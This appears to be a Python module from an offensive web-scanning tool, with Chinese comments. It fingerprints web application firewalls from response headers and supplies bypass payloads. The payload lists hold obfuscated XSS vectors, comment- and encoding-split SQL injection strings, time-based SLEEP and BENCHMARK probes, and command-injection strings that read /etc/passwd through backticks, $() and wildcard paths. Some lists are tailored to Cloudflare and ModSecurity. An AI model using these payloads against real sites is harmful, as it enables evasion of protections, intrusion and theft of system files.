"""WAF 检测与绕过模块"""
import re
import urllib.parse
from typing import List, Dict


# WAF 指纹特征
WAF_FINGERPRINTS = {
    "Cloudflare": [
        r"server:\s*cloudflare",
        r"cf-ray:",
        r"__cfduid=",
        r"cf-cache-status",
    ],
    "Akamai": [
        r"server:\s*AkamaiGHost",
        r"akamai",
        r"x-akamai",
    ],
    "AWS WAF": [
        r"server:\s*amazons3",
        r"x-amzn-requestid",
        r"aws",
    ],
    "ModSecurity": [
        r"mod_security",
        r"modsecurity",
        r"NOYB",
    ],
    "Incapsula": [
        r"incap_ses",
        r"visid_incap",
        r"server:\s*Incapsula",
    ],
    "F5 BIG-IP": [
        r"server:\s*BIG-IP",
        r"BIGipServer",
        r"ts0",
    ],
    "Barracuda": [
        r"barra_counter_session",
        r"barracuda_",
    ],
    "DenyAll": [
        r"sessioncookie",
        r"denyall",
    ],
    "DotDefender": [
        r"x-dotdefender",
        r"dotdefender",
    ],
    " Sucuri": [
        r"sucuri",
        r"cloudproxy",
    ],
    "Imperva": [
        r"imperva",
        r"in캡슐",
    ],
    "YUNDUN": [
        r"yundun",
        r"yd_session",
    ],
    "加速乐": [
        r"jiasule",
        r"jsl_session",
    ],
    "知道创宇": [
        r"ks-waf",
        r"knownsec",
    ],
    "阿里云 WAF": [
        r"aliyundun",
        r"server:\s*Tengine",
        r"cnbj1",
    ],
    "腾讯云 WAF": [
        r"tencent",
        r"server:\s*Tencent",
    ],
    "华为云 WAF": [
        r"huawei",
        r"server:\s*huawei",
    ],
    "百度云 WAF": [
        r"baidu",
        r"server:\s*baidu",
    ],
}


# WAF 绕过 Payloads
WAF_BYPASS_PAYLOADS = {
    "XSS": [
        # 大小写混合
        "<ScRiPt>alert(1)</ScRiPt>",
        "<IMG SRC=x onerror=alert(1)>",
        # 编码绕过
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        # 双写绕过
        "<scrscriptipt>alert(1)</scrscriptipt>",
        # 特殊字符
        "<img src=x onerror=alert&#40;1&#41;>",
        # 事件处理器
        "<svg/onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ],
    "SQLi": [
        # 注释绕过
        "UN/**/ION SEL/**/ECT 1",
        # 大小写
        "UNiOn SeLeCt 1",
        # 内联注释
        "/*!UNION*/ /*!SELECT*/ 1",
        # 编码
        "%55%4e%49%4f%4e %53%45%4c%45%43%54 1",
        # 双写
        "UNIunionON SELselectECT 1",
        # 等价函数
        "SLEEP(5)",
        "BENCHMARK(5000000,SHA1('test'))",
    ],
    "RCE": [
        # 编码绕过
        "$'\x63\x61\x74' /etc/passwd",
        # 变量展开
        "${X}cat /etc/passwd",
        # 通配符
        "/???/??? /etc/passwd",
        # 反引号
        "`cat /etc/passwd`",
        # $()
        "$(cat /etc/passwd)",
    ],
}


def detect_waf(url: str) -> List[Dict]:
    """
    检测目标是否存在 WAF
    :param target_url: 目标 URL
    :return: 检测到的 WAF 列表
    """
    import requests

    detected_wafs = []

    try:
        response = requests.get(url, timeout=10, verify=False)
        headers = response.headers
        body = response.text

        # 合并所有响应内容
        all_content = ""
        for key, value in headers.items():
            all_content += f"{key}: {value}\n"
        all_content += body

        # 匹配 WAF 指纹
        for waf_name, patterns in WAF_FINGERPRINTS.items():
            for pattern in patterns:
                if re.search(pattern, all_content, re.IGNORECASE):
                    detected_wafs.append({
                        "name": waf_name,
                        "pattern": pattern,
                        "confidence": "high"
                    })
                    break

    except Exception as e:
        print(f"[!] WAF 检测失败: {str(e)}")

    return detected_wafs


def get_bypass_payloads(waf_name: str, vuln_type: str) -> List[str]:
    """
    获取针对特定 WAF 的绕过 Payload
    :param waf_name: WAF 名称
    :param vuln_type: 漏洞类型 (XSS/SQLi/RCE)
    :return: 绕过 Payload 列表
    """
    # 通用绕过 payload
    payloads = WAF_BYPASS_PAYLOADS.get(vuln_type, [])

    # 特定 WAF 的绕过 payload
    waf_specific = {
        "Cloudflare": {
            "XSS": [
                "<img/src/onerror=alert(1)>",
                "<svg/onload=alert(1)>",
            ],
            "SQLi": [
                "UNION/**/SELECT 1",
                "1'/**/OR/**/1='1",
            ],
        },
        "ModSecurity": {
            "XSS": [
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
            ],
            "SQLi": [
                "UNION SELECT 1",
                "1 OR 1=1",
            ],
        },
    }

    if waf_name in waf_specific:
        payloads.extend(waf_specific[waf_name].get(vuln_type, []))

    return payloads
